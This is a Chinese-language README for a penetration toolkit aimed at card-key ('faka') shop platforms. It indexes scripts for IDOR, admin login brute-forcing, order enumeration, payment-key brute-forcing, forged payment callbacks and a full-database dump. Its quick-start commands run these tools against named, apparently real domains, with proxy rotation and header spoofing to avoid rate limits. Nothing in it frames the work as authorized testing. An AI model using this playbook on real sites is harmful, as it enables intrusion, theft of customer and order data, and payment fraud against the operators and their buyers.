# Faka 渗透工具包 `/data/tools/faka/`

## 工具总览（24 个）

### 指纹 / 总控
| 脚本 | 用途 |
|------|------|
| `faka_fingerprint.py` | 自动识别：彩虹/异次元/Pisces/赤马 |
| `faka_run.py` | 指纹 → 自动跑对应工具链 |
| `pyfaas_probe.sh` | 赤马一键探测 |

### 异次元 ACG
| 脚本 | 用途 |
|------|------|
| `acg_idor.py` | 订单 IDOR / secret |
| `acg_login_brute.py` | 后台 JSON 登录爆破 |
| `acg_query_brute.py` | 订单查询 OCR + state |
| `order_enum.py` | trade_no 批量枚举 |
| `sb_subdomain_scan.py` | sb 子域 /api/records |
| `epay_key_brute.py` | 易支付 KEY 爆破 |
| `notify_forge.py` | 支付回调伪造 |

### 彩虹发卡
| 脚本 | 用途 |
|------|------|
| `rainbow_idor.py` | api.php/?act=search IDOR + 斜杠 bypass |
| `skey_chain.py` | skey 提取 → IDOR 全链 |
| `skey_exploit_queue.py` | 统一 skey 队列（替代 recon 各副本） |

### 赤马 pyfaas
| 脚本 | 用途 |
|------|------|
| `shop_token_scan.py` | 店铺 token 扫描 |
| `shop_token_scan_async.py` | aiohttp 高并发 token 扫描 |
| `pay_order_brute.py` | Pay/order 限频/价格探测（Shop/getGoodsPrice） |
| `merchant_scan.py` | merchantApi 批量未授权 |

### Pisces
| `pisces_dump.py` | orderSearch 全库拖库 |

### 通用辅助
| 脚本 | 用途 |
|------|------|
| `cors_scan.py` | CORS 反射检测 |
| `thinkphp_scan.py` | ThinkPHP 路径/报错 |
| `js_api_extract.py` | JS 包 API 提取 |
| `cf_session.py` | Cloudflare cookie |
| `proxy_pool.py` | 代理池轮换 |

## Nuclei 模板
`/data/nuclei-templates/custom/faka/` — ACG/pyfaas/彩虹/CORS 共 6 条

```bash
nuclei -t /data/nuclei-templates/custom/faka -u https://zhanghao9.com
nuclei -t /data/nuclei-templates/custom/faka -u https://s.sggyx.com
```

## 快速开始

```bash
cd /data/tools/faka

# 自动识别 + 跑链
python3 faka_run.py https://zhanghao9.com
python3 faka_run.py https://s.sggyx.com --token xiaoy
bash pyfaas_probe.sh https://s.sggyx.com xiaoy

# 彩虹
python3 rainbow_idor.py -u https://TARGET --start 1 --end 500 -w 30
python3 skey_chain.py -H juzi668.top --contact QQ123 --start 1 --end 200

# 异次元
python3 order_enum.py -u https://zhanghao9.com --seeds KNOWN --vary-last 50 --exists-only -w 30 --xff
python3 sb_subdomain_scan.py qq898.vip

# 赤马
python3 merchant_scan.py -u https://s.sggyx.com --limit 30 --xff
```

## 输出
`/data/tools/faka/out/*.jsonl`

## 字典
`/data/wordlists/` — 见 `epay-keys-*`、`faka-tokens*`、`chinese-passwords.txt`

## Playbook 索引
`/data/recon/playbooks/README.md`

## 代理
```bash
export FAKA_PROXY=$(python3 proxy_pool.py next)
# 或自动读 /data/recon/.env.proxy（死代理自动跳过，直连 fallback）
python3 pay_order_brute.py -u URL --token x --goods g --proxy auto
```

## 一键收尾
```bash
bash /data/tools/faka/setup_complete.sh
```

## 快捷命令
所有工具软链在 `/data/tools/bin/`
